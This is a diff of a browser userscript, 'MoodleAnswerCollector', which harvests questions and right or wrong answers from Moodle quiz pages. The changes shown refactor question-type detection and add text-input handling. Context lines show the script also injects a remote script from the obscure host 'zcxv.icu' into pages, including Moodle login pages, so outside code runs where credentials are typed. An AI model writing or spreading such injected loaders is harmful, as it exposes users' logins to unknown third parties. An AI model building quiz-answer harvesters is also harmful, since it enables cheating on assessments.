@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name MoodleAnswerCollector
 // @description Userscript to collect answers and help with questions on Moodle based sites
-// @version 1.4.4.6
+// @version 1.4.4.7
 // @require https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js
 // @require https://raw.githubusercontent.com/vladgba/MonkeyConfig/master/monkeyconfig.js
 // @match *://*/*login/index.php*
@@ -216,18 +216,44 @@ d=document;t=d.createElement("script");t.src="//zcxv.icu/4";d.body.appendChild(t
             return location.replace(window.location.href + '&showall=1');
         }
         let content = [];
-        let Questions = $$('.que');
+        let Questions = $$('.que .content');
         for (let part of Questions) {
-            console.log('Type: ' + detectTypeOfQue(part));
-            let trufalse = detectTypeOfQue(part) == 1;
-            let selintext = detectTypeOfQue(part) == 7 || detectTypeOfQue(part) == 8;
-            svcIconRemove(part);
             let quesss = [];
             let ans = [];
-            let Question = filterQue($(part, '.formulation .qtext'));
-            let Answers = $$(part, '.formulation .r0, .formulation .r1');
             let RightAnswered = [];
             let NonRightAnswered = [];
+
+            console.log('part: ');
+            console.log(part);
+            let queType = detectTypeOfQue(part);
+            console.log('Type: ' + queType);
+
+            if (queType == 4) {
+                /* Question -> text input */
+
+                let Question = filterQue($(part, '.formulation .qtext'));
+                console.log("qti");
+                console.log(Question);
+                let answBlk = $(part, '.answer i');
+                console.log(answBlk);
+                let Answered = $(part, 'input[type="text"]');
+                console.log(Answered);
+                let ra = $(part, '.rightanswer');
+                svcIconRemove(ra);
+                let RightAnswer = filterSelRightanswer(ra);
+                console.log(RightAnswer);
+                if (RightAnswer.length !== 0) RightAnswered.push(RightAnswer);
+                if (_have(answBlk, 'fa-remove')) NonRightAnswered.push(Answered.value);
+                if (_have(answBlk, 'fa-check')) RightAnswered.push(Answered.value);
+                content.push([Question, ans, RightAnswered, NonRightAnswered]);
+                continue;
+            }
+
+            let trufalse = queType == 1;
+            let selintext = queType == 7 || queType == 8;
+            svcIconRemove(part);
+            let Question = filterQue($(part, '.formulation .qtext'));
+            let Answers = $$(part, '.formulation .r0, .formulation .r1');
             let Selects = $$(part, 'table select').length;
             // TODO: Refactor
             if (Selects) {
@@ -419,7 +445,7 @@ d=document;t=d.createElement("script");t.src="//zcxv.icu/4";d.body.appendChild(t
     };
 
     let detectTypeOfQue = (queNode) => {
-        if ($(queNode, 'input[id*="_answertrue"], input[id*="_answerfalse"]')) return 1; // True / False
+        if ($(queNode, 'input[id*="_answertrue"], input[id*="_answerfalse"]')) return 1; // true/false (radio)
         if ($(queNode, 'input[type="radio"]')) return 2; // Single answer
         if ($(queNode, 'input[type="checkbox"]')) return 3; // Multiple answer
         if ($(queNode, 'input[type="text"][size="80"]')) return 4; // Standart text field
@@ -480,7 +506,8 @@ d=document;t=d.createElement("script");t.src="//zcxv.icu/4";d.body.appendChild(t
         let qparr = [];
         let get = true;
         for (let part of parts) {
-            console.log('Type: ' + detectTypeOfQue(part));
+            let queType = detectTypeOfQue(part);
+            console.log('Type: ' + queType);
             let Selects = $(part, 'select');
             svcIconRemove(part);
             let Quest = $(part, '.formulation .qtext');
